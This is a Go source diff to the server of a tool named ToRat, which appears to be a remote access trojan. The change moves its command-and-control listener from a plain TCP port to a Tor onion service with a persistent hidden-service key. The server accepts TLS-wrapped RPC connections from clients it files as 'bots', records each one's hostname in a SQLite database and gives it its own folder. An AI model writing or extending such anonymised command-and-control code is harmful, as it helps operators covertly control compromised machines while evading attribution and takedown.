@@ -1,8 +1,11 @@
 package server
 
 import (
+	"context"
+	"crypto/ed25519"
 	"crypto/tls"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net"
 	"net/rpc"
@@ -10,49 +13,63 @@ import (
 	"path/filepath"
 	"strconv"
 
+	"github.com/cretz/bine/tor"
+	torEd25519 "github.com/cretz/bine/torutil/ed25519"
 	"github.com/fatih/color"
-	"github.com/jinzhu/gorm"
-	_ "github.com/jinzhu/gorm/dialects/sqlite" //sqlite
+	"gorm.io/driver/sqlite"
+	"gorm.io/gorm"
 )
-
-const port = ":1338"
 
 var db *gorm.DB
 
 var activeClients []activeClient
 
 // Start runs the server
-func Start() {
-	var err error
-	db, err = gorm.Open("sqlite3", "ToRat.db")
+func Start() error {
+	var err error // this is needed for gorm
+	db, err = gorm.Open(sqlite.Open("ToRat.db"), &gorm.Config{})
 	if err != nil {
 		log.Fatalln("Could not open db", err)
 	}
 
-	defer db.Close()
-
 	// Migrate the schema
 	db.AutoMigrate(&Client{})
 
-	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
+	cert, err := tls.LoadX509KeyPair("../../keygen/cert.pem", "../../keygen/priv_key.pem")
 	if err != nil {
-		log.Println("could not load cert", err)
-		return
+		return fmt.Errorf("could not load cert: %v", err)
 	}
-	config := tls.Config{Certificates: []tls.Certificate{cert}}
-	ln, err := net.Listen("tcp", port)
+
+	tlsConfig := tls.Config{Certificates: []tls.Certificate{cert}}
+
+	t, err := tor.Start(nil, nil)
 	if err != nil {
-		fmt.Println(err)
-		return
+		return err
 	}
+
+	content, err := ioutil.ReadFile("../../keygen/hs_private")
+	if err != nil {
+		return err
+	}
+
+	var key ed25519.PrivateKey = content
+
+	service, err := t.Listen(context.Background(), &tor.ListenConf{
+		RemotePorts: []int{1337},
+		Key:         torEd25519.FromCryptoPrivateKey(key),
+	})
+	if err != nil {
+		return err
+	}
+	log.Println("Onion service running:", service.ID+".onoin")
+
 	for {
-		conn, err := ln.Accept()
+		conn, err := service.Accept()
 		if err != nil {
 			log.Println("accepting failed:", err)
 			continue
 		}
-		//log.Println("got new connection")
-		tlsconn := tls.Server(conn, &config)
+		tlsconn := tls.Server(conn, &tlsConfig)
 		go accept(tlsconn)
 	}
 }
@@ -61,17 +78,16 @@ func accept(conn net.Conn) {
 	var c activeClient
 
 	c.RPC = rpc.NewClient(conn)
-	err := c.GetHostname()
-	if err != nil {
-		log.Println("Invalid Hostname", err)
+
+	if err := c.GetHostname(); err != nil {
+		log.Println("Invalid Hostname:", err)
 		return
 	}
 	c.Client = Client{Hostname: c.Hostname, Path: filepath.Join("bots", c.Hostname)}
-	log.Println(&c.Client, Client{Hostname: c.Hostname})
-	log.Println(db)
+
 	db.FirstOrCreate(&c.Client, Client{Hostname: c.Hostname})
 
-	if _, err = os.Stat(c.Client.Path); err != nil {
+	if _, err := os.Stat(c.Client.Path); err != nil {
 		os.MkdirAll(c.Client.Path, os.ModePerm)
 	}
 	if c.Client.Name == "" {
